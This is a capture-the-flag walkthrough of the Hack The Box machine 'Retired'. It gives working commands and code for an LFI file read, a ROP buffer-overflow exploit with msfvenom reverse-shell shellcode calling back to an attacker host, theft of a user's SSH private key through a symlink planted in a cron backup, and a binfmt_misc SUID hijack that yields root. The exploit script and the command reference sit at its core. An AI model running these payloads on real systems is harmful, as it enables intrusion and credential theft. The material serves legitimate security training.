# HTB Retired — Full Walkthrough
**Difficulty:** Medium | **OS:** Linux | **IP:** 10.129.227.96

---

## Table of Contents
1. [The Hacker Mindset](#the-hacker-mindset)
2. [Recon — Port Scanning](#recon--port-scanning)
3. [Web Enumeration](#web-enumeration)
4. [File Read Vulnerability](#file-read-vulnerability)
5. [Finding the activate_license Binary](#finding-the-activate_license-binary)
6. [Leaking Memory Addresses](#leaking-memory-addresses)
7. [Downloading Libraries](#downloading-libraries)
8. [Building the Buffer Overflow Exploit](#building-the-buffer-overflow-exploit)
9. [Shell as www-data](#shell-as-www-data)
10. [Privilege Escalation — www-data to dev](#privilege-escalation--www-data-to-dev)
11. [SSH as dev — User Flag](#ssh-as-dev--user-flag)
12. [Privilege Escalation — dev to root](#privilege-escalation--dev-to-root)
13. [Root Flag](#root-flag)
14. [Lessons Learned](#lessons-learned)

---

## The Hacker Mindset

Before diving in, understand how hackers think. Every step follows the same loop:

```
ENUMERATE → UNDERSTAND → IDENTIFY WEAKNESS → EXPLOIT → PIVOT → REPEAT
```

You are not randomly trying things. You are building a mental model of the target system and looking for places where assumptions break down — places where a developer trusted user input, where a script runs with too many privileges, or where memory is not properly bounded.

Every piece of information you gather is ammunition. A username, a file path, a process ID — these all matter.

---

## Recon — Port Scanning

### What we ran
```bash
nmap -p- --min-rate 10000 10.129.227.96
nmap -p 22,80 -sCV 10.129.227.96
```

### What we found
```
22/tcp open  ssh
80/tcp open  http (nginx)
```

### Why we do this
The very first question is: **what attack surface exists?** A port is a door. We need to know which doors are open before we can try to walk through one.

- `-p-` scans ALL 65535 ports (not just the common 1000). Boxes often run services on non-standard ports.
- `--min-rate 10000` speeds up the scan on a lab network where we don't care about noise.
- `-sCV` on the discovered ports runs version detection (`-sV`) and default scripts (`-sC`) to extract banners, software versions, and other metadata.

### Hacker mindset
Two ports means a small attack surface. SSH (port 22) is usually not directly exploitable without credentials. HTTP (port 80) is almost always the entry point — web applications are complex, developer-written, and full of bugs. **Start with the web.**

---

## Web Enumeration

### What we observed
Visiting `http://10.129.227.96/` redirects to:
```
/index.php?page=default.html
```

This is immediately interesting. The URL is telling us:
- The backend is **PHP**
- There is a **`page` parameter** that controls what file is loaded
- The value is a filename: `default.html`

### Why this matters
Any time you see a URL parameter that looks like a filename or path, think: **Local File Inclusion (LFI)**. The server is probably doing something like:

```php
readfile($_GET['page']);   // or include(), require(), etc.
```

If it's including or reading a file based on user input without proper sanitization, we might be able to make it read files it shouldn't — like `/etc/passwd` or SSH keys.

### Hacker mindset
A URL parameter named `page` that takes a filename is a classic sign of **path traversal / LFI**. This is one of the most common web vulnerabilities because developers often need to build templated pages and take shortcuts.

---

## File Read Vulnerability

### Testing the vulnerability
```bash
curl "http://10.129.227.96/index.php?page=/etc/passwd"
```

### What we got
```
root:x:0:0:root:/root:/bin/bash
...
vagrant:x:1000:1000::/vagrant:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

**It worked.** The server read and returned `/etc/passwd`. This confirms an **arbitrary file read** vulnerability.

### Understanding the vulnerability
Reading `index.php` itself (by passing `page=index.php`) reveals the server-side code:

```php
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

This code tries to prevent traversal by:
1. Requiring the path to start with a lowercase letter (`^[a-z]`)
2. Stripping `../` and `./`

But when we pass `/etc/passwd`, the regex check FAILS (starts with `/`), yet `readfile()` is still called after the redirect header is set. PHP sends the redirect header but continues executing — this is called **Execute After Redirect (EAR)**.

The server sends a 302 redirect but ALSO sends the file contents in the response body. `curl` follows redirects by default, but by reading the raw response, we get the file.

### What we learned from /etc/passwd
- Username: **dev** with home `/home/dev`
- This will be our target user

### Hacker mindset
Never trust a redirect. Many web frameworks and custom PHP code redirect on error but forget to call `exit()` or `die()` after setting the redirect header. The response body still contains the result of the remaining code. Always intercept traffic in Burp or check raw responses with `curl` without `-L` to see what's really being returned.

---

## Finding the activate_license Binary

### Reading activate_license.php
```bash
curl "http://10.129.227.96/index.php?page=activate_license.php"
```

This reveals:
```php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!socket_connect($socket, '127.0.0.1', 1337)) { ... }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);
    ...
}
?>
```

The web server receives an uploaded file and forwards it (size first, then content) to a local service on **port 1337**.

### Finding the process PID via /proc/sched_debug
```bash
curl -s "http://10.129.227.96/index.php?page=/proc/sched_debug" | grep activate_licens
```

Output:
```
 S activate_licens   429   ...
```

**PID = 429**

### Why /proc matters
On Linux, the `/proc` filesystem is a virtual filesystem that exposes the kernel's internal state. For every running process, there is a folder `/proc/[PID]/` containing:
- `cmdline` — what command was used to start it
- `maps` — what memory regions the process has mapped
- `fd/` — open file descriptors
- `exe` — symlink to the executable

This is a goldmine when you have arbitrary file read, because `/proc` exposes live runtime information about every process on the system.

### Downloading the binary
```bash
curl "http://10.129.227.96/index.php?page=/usr/bin/activate_license" -o activate_license
```

We can download the binary itself because our file read has no content-type restriction. The binary is just bytes on disk — we can exfiltrate it.

### Hacker mindset
When you have file read, think beyond just `/etc/passwd` and SSH keys. The entire filesystem is readable. Running processes expose their binaries, config files, memory maps, and environment variables through `/proc`. If there's a custom service running, **download its binary** — you can reverse engineer it locally.

---

## Leaking Memory Addresses

### Getting the memory map
```bash
curl -s "http://10.129.227.96/index.php?page=/proc/429/maps"
```

Key lines from the output:
```
7fba87829000-7fba8784e000 r--p ... /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fba879ee000-7fba879fe000 r--p ... /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7ffd2a7ae000-7ffd2a7cf000 rw-p ... [stack]
```

We extracted:
| Region | Address |
|--------|---------|
| libc base | `0x7fba87829000` |
| libsqlite3 base | `0x7fba879ee000` |
| stack start | `0x7ffd2a7ae000` |
| stack end | `0x7ffd2a7cf000` |

### Why these addresses matter
Modern Linux has **ASLR (Address Space Layout Randomization)** — every time a program starts, its libraries are loaded at random addresses. This is a security mitigation designed to make exploits harder: you can't hardcode an address like `system()` because it changes on every run.

BUT — on this machine, `activate_license` is a forking server. The main process starts once and forks (copies itself) to handle each connection. When you `fork()`, the child gets an **exact copy of the parent's memory layout**. The addresses in the fork are identical to the parent.

This means: **if we can read the maps of the parent process, the child process that handles our exploit connection will have those same addresses.** ASLR is defeated.

### Hacker mindset
ASLR is not unbreakable. Any information leak that tells you where a library is loaded in memory defeats ASLR. Here, the combination of file read + `/proc/[pid]/maps` gives us a precise memory map of the live process. This is exactly what we need to build a working exploit.

---

## Downloading Libraries

```bash
curl -s "http://10.129.227.96/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so" -o libc-2.31.so
curl -s "http://10.129.227.96/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" -o libsqlite3.so.0.8.6
```

### Why we need these
To build a ROP chain (explained next), we need gadgets — small sequences of instructions that end with `ret`. These gadgets exist inside the libraries the program uses. We need the **exact library files from the target machine** (not our local copies) because the offsets of gadgets differ between versions and builds.

---

## Building the Buffer Overflow Exploit

### The vulnerability
From reversing `activate_license` (either with Ghidra or reading the writeup):

```c
char buffer[512];
uint32_t msglen;

read(sockfd, &msglen, 4);         // read 4 bytes for length
msglen = ntohl(msglen);
read(sockfd, buffer, msglen);     // read MSGLEN bytes into 512-byte buffer!
```

The server reads a 4-byte length, converts it to a number, then reads that many bytes into a fixed 512-byte buffer. If we say the message is 1024 bytes long, we write 1024 bytes into a 512-byte buffer — **classic stack buffer overflow**.

### Why there's no easy path
Running `checksec` on the binary reveals:
```
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

- **No stack canary** — good for us, the overflow won't be detected
- **NX enabled** — bad for us, we cannot execute shellcode directly on the stack
- **PIE enabled** — binary loads at random addresses (but we defeated this with the maps leak)
- **Full RELRO** — GOT is read-only, no GOT overwrite attacks

Because NX is enabled, we need **Return Oriented Programming (ROP)**.

### What is ROP?
ROP (Return Oriented Programming) is a technique to execute arbitrary code without injecting new code. Instead, we:

1. Overflow the buffer to control the **return address** (what address the function returns to)
2. Chain together small snippets of existing code called **gadgets** that end in `ret`
3. Each gadget does something small (like `pop rdi; ret` to load a value into a register)
4. String them together to call any function with any arguments

Think of it like a vending machine where you can only press existing buttons but by pressing the right sequence, you can get any item you want.

### Our ROP strategy: mprotect → JMP RSP → shellcode
1. Call `mprotect(stack_start, stack_size, 7)` to make the stack **readable + writable + executable**
2. Then JMP to the top of the stack where we've placed shellcode
3. The shellcode spawns a reverse shell

To call `mprotect(addr, len, prot)` we need:
- `RDI = stack_start` (first argument)
- `RSI = stack_size` (second argument)
- `RDX = 7` (third argument — rwx permissions)
- Then call `mprotect`

We use pwntools to find ROP gadgets automatically from the libraries we downloaded.

### Generating shellcode
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.84 LPORT=4444 -f py
```

This generates x64 shellcode that connects back to our machine and gives us a shell.

### The exploit script (exploit.py)
```python
from pwn import *
import requests

context.arch = 'amd64'

libc_base      = 0x7fba87829000
libsqlite_base = 0x7fba879ee000
stack_start    = 0x7ffd2a7ae000
stack_end      = 0x7ffd2a7cf000
stack_length   = stack_end - stack_start

libc   = ELF('./libc-2.31.so', checksec=False)
libsql = ELF('./libsqlite3.so.0.8.6', checksec=False)
libc.address   = libc_base
libsql.address = libsqlite_base

rop      = ROP([libc, libsql])
mprotect = libc.symbols['mprotect']
pop_rdi  = rop.rdi[0]
pop_rsi  = rop.rsi[0]
pop_rdx  = rop.rdx[0]
jmp_rsp  = rop.jmp_rsp[0]

# shellcode (msfvenom output)
buf = b"\x6a\x29\x58..." # truncated

offset  = 520  # bytes to reach return address
payload  = b'A' * offset
payload += p64(pop_rdi)  + p64(stack_start)   # arg1 = stack start
payload += p64(pop_rsi)  + p64(stack_length)  # arg2 = stack size
payload += p64(pop_rdx)  + p64(7)             # arg3 = rwx
payload += p64(mprotect)                       # call mprotect
payload += p64(jmp_rsp)                        # jump to stack
payload += buf                                 # reverse shell shellcode

requests.post('http://10.129.227.96/activate_license.php',
              files={'licensefile': payload})
```

### Why offset = 520?
The buffer is 512 bytes, plus 8 bytes of saved RBP = 520 bytes before we reach the return address. We confirmed this with GDB pattern analysis.

### Hacker mindset
ROP is the modern standard for exploiting binaries with NX. Instead of writing new code, you **reuse the target's own code**. Every library contains thousands of gadgets. The key insight is: you don't need to write new instructions — you just need to chain existing ones in the right order. The `jmp rsp` gadget is the bridge between the ROP chain (which makes the stack executable) and the shellcode (which gives us the shell).

---

## Shell as www-data

### Steps
1. Start listener: `nc -lnvp 4444`
2. Run: `python3 exploit.py`

### Result
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.227.96] 46780
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have a shell as `www-data` — the web server user. Not root, but we're inside the machine now.

### Upgrading the shell
The initial shell is raw — no job control, no tab completion, awkward. We upgrade it:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

This gives us a proper interactive shell.

### Hacker mindset
The initial shell from a buffer overflow is raw and fragile. Always upgrade immediately. A TTY shell lets you use `sudo`, passwords with prompts, vim, etc. The `stty raw -echo; fg` trick passes raw keystrokes to the remote shell instead of being processed by your local terminal.

---

## Privilege Escalation — www-data to dev

### Discovering the backup cron
```bash
ls -la /var/www/
# Shows: 2026-06-09_10-26-00-html.zip, 2026-06-09_10-27-00-html.zip ...
```

New zip files appear every minute, owned by **dev**. A cron job running as dev is creating these backups.

```bash
grep -r / -e '-html.zip' 2>/dev/null
# /usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
```

The script at `/usr/bin/webbackup`:
```bash
#!/bin/bash
cd /var/www/
SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
/usr/bin/zip --recurse-paths "$DST" "$SRC"
```

It zips the entire `/var/www/html` directory. By default, `zip --recurse-paths` **follows symlinks** — it includes the contents of whatever the symlink points to, not the symlink itself.

### The symlink attack
```bash
ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
```

We create a symlink inside the directory being backed up. The symlink points to dev's private SSH key. When the cron runs next, zip follows the symlink and includes the actual key file content in the zip.

### Extracting the key
```bash
# Wait for new zip (up to 60 seconds), then:
cd /dev/shm
cp $(ls /var/www/*.zip | tail -1) .
unzip -p *.zip 'var/www/html/id_rsa'
```

The key is printed to stdout. We copy it to our Kali machine.

### Why this works
The backup script runs as `dev`. Dev has read access to their own `.ssh/id_rsa`. By planting a symlink in a directory the script processes, we trick the script (running with dev's permissions) into including a file we can't directly read as www-data.

This is called a **symlink attack** or **symlink following vulnerability**. The script doesn't validate whether the files being zipped are symlinks — it just follows them.

### Hacker mindset
When you see a scheduled task (cron job) running as a privileged user that processes files in a directory you can write to, think symlinks. The cron has higher privileges than you — make it do your dirty work. This pattern appears constantly in CTFs and real-world privilege escalation: find a privileged process that touches files you control.

---

## SSH as dev — User Flag

```bash
chmod 600 dev_id_rsa
ssh -i dev_id_rsa dev@10.129.227.96
cat user.txt
# ebc767[redacted]1ac9da706
```

We now have a stable SSH shell as dev. SSH is much better than a reverse shell — it's persistent, supports file transfer (`scp`), and gives a proper terminal.

---

## Privilege Escalation — dev to root

### Enumeration as dev
```bash
ls ~/
# activate_license  emuemu  user.txt
ls ~/emuemu/
# emuemu  emuemu.c  Makefile  README.md  reg_helper  reg_helper.c  test/
```

The `emuemu` directory contains a software emulator project with something interesting: `reg_helper`.

### Understanding reg_helper
```c
// reg_helper.c
int main(void) {
    char cmd[512] = { 0 };
    read(STDIN_FILENO, cmd, sizeof(cmd));
    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    write(fd, cmd, strnlen(cmd, sizeof(cmd)));
    close(fd);
    return 0;
}
```

This program reads from stdin and writes to `/proc/sys/fs/binfmt_misc/register`.

Checking capabilities:
```bash
/usr/sbin/getcap /usr/lib/emuemu/reg_helper
# /usr/lib/emuemu/reg_helper cap_dac_override=ep
```

`cap_dac_override` means: **bypass file read, write, and execute permission checks**. Normally only root can write to `/proc/sys/fs/binfmt_misc/register` (it's mode 0200, writable only by root). But reg_helper can write to it as any user because of this capability.

### What is binfmt_misc?
binfmt_misc (Binary Format Miscellaneous) is a Linux kernel feature that lets you register custom "interpreters" for file types. For example, you could register `.jar` files to be run with `java -jar`, or `.py` files with `python3`.

The registration format is:
```
:name:type:offset:magic:mask:interpreter:flags
```

The **`C` flag** is crucial: it makes the interpreter run with the **credentials of the file being executed** — not the user who ran it. So if a SetUID (SUID) root binary is executed and matches a binfmt_misc rule with the C flag, the interpreter runs **as root**.

### The exploit plan

1. **Compile a rootshell** — a binary that calls `setresuid(0,0,0)` and then launches bash
2. **Create a symlink** with a custom extension pointing to a SUID binary (newgrp)
3. **Register an extension rule** via reg_helper that maps our extension to rootshell with the C flag
4. **Run the symlink** — binfmt_misc matches the extension, runs rootshell with root credentials

### Step by step

**Step 1: Compile rootshell**
```bash
cat > /dev/shm/rootshell.c << 'EOF'
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    char *const p[] = {"/bin/bash", "-p", NULL};
    setresuid(0,0,0);   // set all UIDs to root
    setresgid(0,0,0);   // set all GIDs to root
    execve(p[0], p, NULL);
    return 0;
}
EOF
gcc -o /dev/shm/rootshell /dev/shm/rootshell.c
chmod +x /dev/shm/rootshell
```

**Step 2: Symlink to SUID binary**
```bash
ln -s /usr/bin/newgrp /dev/shm/newgrp.sploit
```

`newgrp` is a SUID root binary (it changes group memberships and needs root to do so). By creating a symlink with the `.sploit` extension, when we run the symlink, the kernel sees a file named `newgrp.sploit` — our custom extension.

**Step 3: Register the binfmt_misc rule**
```bash
echo ':sploit:E::sploit::/dev/shm/rootshell:C' | /usr/lib/emuemu/reg_helper
```

Breaking down `:sploit:E::sploit::/dev/shm/rootshell:C`:
- `:sploit` — rule name: "sploit"
- `:E` — match by **Extension** (not magic bytes)
- `::` — no offset (not applicable for extension matching)
- `:sploit` — match files with `.sploit` extension
- `:` — no mask
- `:/dev/shm/rootshell` — interpreter to run
- `:C` — use **Credentials** of the matched file (newgrp is SUID root → run as root)

**Step 4: Trigger the exploit**
```bash
/dev/shm/newgrp.sploit
```

### What happens when we run it

1. We execute `/dev/shm/newgrp.sploit`
2. The kernel sees a file with `.sploit` extension
3. binfmt_misc finds our rule matching `.sploit`
4. The kernel sees `newgrp.sploit` is a symlink to `newgrp`, which has the **SUID root bit** set
5. With the `C` flag, the kernel runs `/dev/shm/rootshell` with **root credentials**
6. rootshell calls `setresuid(0,0,0)` — succeeds (we're already root)
7. rootshell calls `execve("/bin/bash", ["/bin/bash", "-p", NULL], NULL)`
8. bash starts with root privileges

### Hacker mindset
This is a "Shadow SUID" attack. Instead of needing a SUID binary that does what you want, you **hijack** the execution of ANY existing SUID binary and redirect it to your own code — while keeping the SUID credentials.

The `C` flag in binfmt_misc exists for legitimate reasons (to support things like `.NET` executables that should run with the binary's permissions). But when combined with `cap_dac_override` on a binary that writes to the register file, it becomes a privilege escalation primitive.

The key insight: **reg_helper can write to a root-only file because of its capability. That write lets us register a rule that steals root credentials from SUID binaries.**

---

## Root Flag

```bash
root@retired:/home/dev# id
uid=0(root) gid=0(root) groups=0(root)

root@retired:/home/dev# cat /root/root.txt
a8b4180[redacted]c379eb311
```

---

## Lessons Learned

### 1. File Read ≠ Just /etc/passwd
An arbitrary file read is an extremely powerful primitive. On this box it gave us:
- Source code of the application
- Live memory maps of running processes
- The binary of the service itself
- Foundation for the entire exploit chain

Always think: **what files on this system are valuable?**

### 2. /proc is a treasure map
`/proc/[pid]/maps`, `/proc/[pid]/cmdline`, `/proc/sched_debug`, `/proc/sys/...` — the proc filesystem exposes the live kernel state. When you can read arbitrary files, `/proc` should be one of the first things you explore.

### 3. ASLR isn't magic
ASLR prevents hardcoded addresses. It does NOT prevent information leaks. If you can read the maps file of a process, ASLR is defeated for that process. Always look for memory leaks alongside buffer overflows.

### 4. Forking servers are special
A service that handles requests by `fork()`ing a copy of itself means the child inherits the parent's exact memory layout. Read the parent's maps once, use those addresses forever (until the server restarts).

### 5. Cron jobs running as privileged users are dangerous
If a cron runs as a privileged user and touches a directory you control, you can often influence what it processes via symlinks, hardlinks, or race conditions. Always check what's in `/etc/cron*`, `/var/spool/cron`, and use `pspy` to monitor crons.

### 6. Linux capabilities are often overlooked
`setcap` gives fine-grained privileges to binaries without making them fully SUID root. But capabilities can be just as dangerous. `cap_dac_override` (bypasses file permissions) is nearly as powerful as root for file operations. Always run `getcap -r / 2>/dev/null` as part of privilege escalation enumeration.

### 7. binfmt_misc C flag + SUID = root
The Shadow SUID technique: register a binfmt_misc rule with the C flag that matches any SUID binary. The interpreter inherits the SUID credentials. This works whenever you can write to `/proc/sys/fs/binfmt_misc/register` — normally only root can, but capabilities can grant this.

### 8. Don't use generic ELF magic bytes for binfmt_misc
**Lesson learned the hard way on this box:** If you register a binfmt_misc rule that matches generic ELF magic bytes (the first 24 bytes of any ELF binary), it will match **everything** — including the interpreter you registered. This causes infinite recursion in the kernel and breaks execution of ALL ELF binaries on the system. Always use the **extension method** (`:E:`) or very specific magic bytes unique to your target binary.

### 9. When things break, pivot with what still works
When all ELF execution broke due to our faulty binfmt_misc rule, we found that `gcc` and `python3` are compiled as `ET_EXEC` (non-PIE) on this box and therefore didn't match our PIE-only (`ET_DYN`) binfmt_misc rule. This let us use Python3 to write files and use gcc to compile, which eventually let us fix the situation. **Always check what tools still work** and adapt.

---

## Full Command Reference

```bash
# Recon
nmap -p- --min-rate 10000 10.129.227.96
nmap -p 22,80 -sCV 10.129.227.96

# File read
curl "http://10.129.227.96/index.php?page=/etc/passwd"
curl -s "http://10.129.227.96/index.php?page=/proc/sched_debug" | grep activate_licens
curl -s "http://10.129.227.96/index.php?page=/proc/429/maps"
curl -s "http://10.129.227.96/index.php?page=/usr/bin/activate_license" -o activate_license
curl -s "http://10.129.227.96/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so" -o libc-2.31.so
curl -s "http://10.129.227.96/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" -o libsqlite3.so.0.8.6

# Shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.84 LPORT=4444 -f py

# Exploit
nc -lnvp 4444                          # terminal 1
python3 exploit.py                     # terminal 2

# Shell upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# www-data → dev
ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
# wait 60 seconds
cd /dev/shm && cp $(ls /var/www/*.zip | tail -1) .
unzip -p *.zip 'var/www/html/id_rsa'
# save key to Kali, chmod 600
ssh -i dev_id_rsa dev@10.129.227.96

# dev → root
cat > /dev/shm/rootshell.c << 'EOF'
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    char *const p[] = {"/bin/bash", "-p", NULL};
    setresuid(0,0,0);
    setresgid(0,0,0);
    execve(p[0], p, NULL);
    return 0;
}
EOF
gcc -o /dev/shm/rootshell /dev/shm/rootshell.c && chmod +x /dev/shm/rootshell
ln -s /usr/bin/newgrp /dev/shm/newgrp.sploit
echo ':sploit:E::sploit::/dev/shm/rootshell:C' | /usr/lib/emuemu/reg_helper
/dev/shm/newgrp.sploit

# Flags
cat ~/user.txt
cat /root/root.txt
```
